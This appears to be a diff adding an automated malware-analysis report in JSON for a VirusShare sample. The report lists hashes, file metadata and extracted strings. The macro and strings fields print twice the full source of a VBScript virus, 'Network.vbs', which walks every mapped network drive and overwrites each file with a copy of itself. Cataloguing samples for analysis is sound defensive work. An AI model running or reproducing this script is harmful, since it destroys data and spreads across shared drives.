@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "Rem \"Network.vbs\" by FSO\nOn Error Resume Next\nDim FSO,Net,Drives,X\nSet FSO=CreateObject(\"Scripting.FileSystemObject\")\nSet Net=CreateObject(\"WScript.Network\")\nSet Drives=Net.EnumNetworkDrives\nFor X=1 To Drives.Count 'Enum. Net Drives...\nInfectFiles(Net.Item(X)&\"\\\")\nListFolders(Net.Item(X)&\"\\\")\nNext\nFunction ListFolders(netpath)\nOn Error Resume Next\nDim Fldr,Sbfs,netpath,Sbf\nSet Fldr=FSO.GetFolder(netpath)\nSet Sbfs=Fldr.Subfolders\nFor Each Sbf In Sbfs\nInfectFiles(Sbf.Path)\nListFolders(Sbf.Path)\nNext\nEnd Function\nFunction InfectFiles(foldername)\nOn Error Resume Next\nDim Fld,Files,OurCode,F,foldername\nSet Fld=FSO.GetFolder(foldername)\nSet Files=Fld.Files\nSet OurCode=FSO.GetFile(WScript.ScriptFullName)\nFor Each F In Files\nOurCode.Copy F.Path\nNext\nEnd Function"
+    },
+    "filename": "VirusShare_453c22d726e12781300841a5ce273f7b",
+    "filesize": 795,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "453c22d726e12781300841a5ce273f7b",
+        "sha1": "2ff6b4bcd43dc480eb89de00feb8ae977a5d6b31",
+        "sha256": "193eb53f93369dac7d5ee3f554d5bb722f27beb66a5e603780e71d3a160acc2c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Rem \"Network.vbs\" by FSO",
+            "On Error Resume Next",
+            "Dim FSO,Net,Drives,X",
+            "Set FSO=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set Net=CreateObject(\"WScript.Network\")",
+            "Set Drives=Net.EnumNetworkDrives",
+            "For X=1 To Drives.Count 'Enum. Net Drives...",
+            "InfectFiles(Net.Item(X)&\"\\\")",
+            "ListFolders(Net.Item(X)&\"\\\")",
+            "Next",
+            "Function ListFolders(netpath)",
+            "On Error Resume Next",
+            "Dim Fldr,Sbfs,netpath,Sbf",
+            "Set Fldr=FSO.GetFolder(netpath)",
+            "Set Sbfs=Fldr.Subfolders",
+            "For Each Sbf In Sbfs",
+            "InfectFiles(Sbf.Path)",
+            "ListFolders(Sbf.Path)",
+            "Next",
+            "End Function",
+            "Function InfectFiles(foldername)",
+            "On Error Resume Next",
+            "Dim Fld,Files,OurCode,F,foldername",
+            "Set Fld=FSO.GetFolder(foldername)",
+            "Set Files=Fld.Files",
+            "Set OurCode=FSO.GetFile(WScript.ScriptFullName)",
+            "For Each F In Files",
+            "OurCode.Copy F.Path",
+            "Next",
+            "End Function"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271091",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
